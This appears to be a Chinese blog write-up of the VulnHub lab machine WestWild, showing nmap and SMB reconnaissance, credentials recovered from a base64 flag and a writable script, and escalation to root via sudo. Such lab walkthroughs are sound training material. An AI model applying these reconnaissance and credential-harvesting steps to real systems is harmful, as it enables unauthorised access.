+++
date = '2026-11-24T19:39:17+08:00'
draft = false
title = '[VulnHub靶机]WestWild渗透记录'
tags = ['渗透','Vulnhub']
categories = ["靶机渗透"]
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.24

```shell
┌──(kali㉿kali)-[~/WestWild]
└─$ sudo arp-scan -l                             
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.24     00:0c:29:15:99:87       VMware, Inc.
10.10.10.254    00:50:56:f8:1d:31       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.951 seconds (131.21 hosts/sec). 4 responded
```

探测开放端口

```shell
┌──(kali㉿kali)-[~/WestWild]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.24  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-24 19:40 +0800
Nmap scan report for 10.10.10.24
Host is up (0.00045s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:15:99:87 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.20 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/WestWild]
└─$ sudo nmap -sT -sV -sC -O -p22,80,139,445 10.10.10.24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-24 19:40 +0800
Nmap scan report for 10.10.10.24
Host is up (0.00042s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 6f:ee:95:91:9c:62:b2:14:cd:63:0a:3e:f8:10:9e:da (DSA)
|   2048 10:45:94:fe:a7:2f:02:8a:9b:21:1a:31:c5:03:30:48 (RSA)
|   256 97:94:17:86:18:e2:8e:7a:73:8e:41:20:76:ba:51:73 (ECDSA)
|_  256 23:81:c7:76:bb:37:78:ee:3b:73:e2:55:ad:81:32:72 (ED25519)
80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 00:0C:29:15:99:87 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.8 - 3.16 (97%), Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), Linux 3.13 - 4.4 (95%), Linux 3.13 (94%), Linux 3.13 - 3.16 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4
.4) (94%), Linux 4.10 (94%), Android 5.0 - 6.0.1 (Linux 3.4) (94%), Android 8 - 9 (Linux 3.18 - 4.4) (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: WESTWILD; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: WESTWILD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2026-11-24T19:41:08
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: westwild
|   NetBIOS computer name: WESTWILD\x00
|   Domain name: \x00
|   FQDN: westwild
|_  System time: 2026-11-24T22:41:08+03:00
|_clock-skew: mean: 7h00m00s, deviation: 1h43m54s, median: 7h59m59s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.75 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/WestWild]
└─$ sudo nmap --script=vuln -p22,80,139,445 10.10.10.24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-24 19:41 +0800
Nmap scan report for 10.10.10.24
Host is up (0.00036s latency).

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:15:99:87 (VMware)

Host script results:
| smb-vuln-regsvc-dos:
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false

Nmap done: 1 IP address (1 host up) scanned in 321.94 seconds
```

## Web信息收集

访问80端口, 提示我们只需跟随波浪(wave)就会很容易

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/WestWild/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

## SMB服务信息收集

匿名列出靶机所有共享

```shell
┌──(kali㉿kali)-[~/WestWild]
└─$ smbclient -L 10.10.10.24 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        wave            Disk      WaveDoor
        IPC$            IPC       IPC Service (WestWild server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            WESTWILD
```

尝试匿名连接wave共享

```shell
┌──(kali㉿kali)-[~/WestWild]
└─$ smbclient //10.10.10.24/wave -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 30 13:18:56 2019
  ..                                  D        0  Fri Aug  2 07:02:20 2019
  FLAG1.txt                           N       93  Tue Jul 30 10:31:05 2019
  message_from_aveng.txt              N      115  Tue Jul 30 13:21:48 2019

                1781464 blocks of size 1024. 285220 blocks available
```

发现两个文件, 把它们全下载下来

```shell
smb: \> prompt
smb: \> mget *
```

读取FLAG1.txt, 获得一组凭据

```shell
┌──(kali㉿kali)-[~/WestWild]
└─$ cat FLAG1.txt                                        
RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K
                                                                                                                                           
┌──(kali㉿kali)-[~/WestWild]
└─$ echo RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K | base64 -d
Flag1{Welcome_T0_THE-W3ST-W1LD-B0rder}
user:wavex
password:door+open
```

读取message_from_aveng.txt

```text
Dear Wave ,
Am Sorry but i was lost my password ,
and i believe that you can reset  it for me . 
Thank You 
Aveng
```

使用用户名`wavex`, 密码`door+open`登录ssh

```shell
┌──(kali㉿kali)-[~/WestWild]
└─$ ssh wavex@10.10.10.24
The authenticity of host '10.10.10.24 (10.10.10.24)' can't be established.
ED25519 key fingerprint is: SHA256:oeuytnbnPest0/m/OtTQyjaFSRv03+EMhBmAX886bsk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.24' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
wavex@10.10.10.24's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Nov 24 22:38:42 +03 2026

  System load: 0.0               Memory usage: 4%   Processes:       170
  Usage of /:  77.9% of 1.70GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Fri Aug  2 02:00:40 2019
wavex@WestWild:~$
```

## 权限提升

查找所有具有写权限的文件

```shell
wavex@WestWild:/home$ find / -writable -type f -not -path "/proc/*" 2>/dev/null   
/sys/fs/cgroup/systemd/user/1001.user/1.session/tasks
/sys/fs/cgroup/systemd/user/1001.user/1.session/cgroup.procs
/sys/kernel/security/apparmor/policy/.remove
/sys/kernel/security/apparmor/policy/.replace
/sys/kernel/security/apparmor/policy/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.ns_name
/sys/kernel/security/apparmor/.ns_level
/sys/kernel/security/apparmor/.ns_stacked
/sys/kernel/security/apparmor/.stacked
/sys/kernel/security/apparmor/.access
/usr/share/av/westsidesecret/ififoregt.sh
/home/wavex/.cache/motd.legal-displayed
/home/wavex/wave/FLAG1.txt
/home/wavex/wave/message_from_aveng.txt
/home/wavex/.profile
/home/wavex/.bashrc
/home/wavex/.viminfo
/home/wavex/.bash_logout
```

注意到`/usr/share/av/westsidesecret/ififoregt.sh`, 查看可知密码

```bash
#!/bin/bash 
 figlet "if i foregt so this my way"
 echo "user:aveng"
 echo "password:kaizen+80"
```

切换用户

```shell
wavex@WestWild:/home$ su aveng
Password: 
aveng@WestWild:/home$
```

sudo -l, 发现能执行任意命令

```shell
aveng@WestWild:/home$ sudo -l
[sudo] password for aveng: 
Matching Defaults entries for aveng on WestWild:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aveng may run the following commands on WestWild:
    (ALL : ALL) ALL
```

直接提权读flag

```shell
aveng@WestWild:/home$ sudo su
root@WestWild:/home# cd /root
root@WestWild:~# ls -lah
total 36K
drwx------  3 root root 4.0K Aug  2  2019 .
drwxr-xr-x 21 root root 4.0K Jul 30  2019 ..
-rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc
drwx------  2 root root 4.0K Jul 31  2019 .cache
-rw-r--r--  1 root root  122 Jul 31  2019 FLAG2.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root   75 Jul 31  2019 .selected_editor
-rw-------  1 root root 4.9K Jul 31  2019 .viminfo
root@WestWild:~# cat FLAG2.txt 
Flag2{Weeeeeeeeeeeellco0o0om_T0_WestWild}

Great! take a screenshot and Share it with me in twitter @HashimAlshareff
```
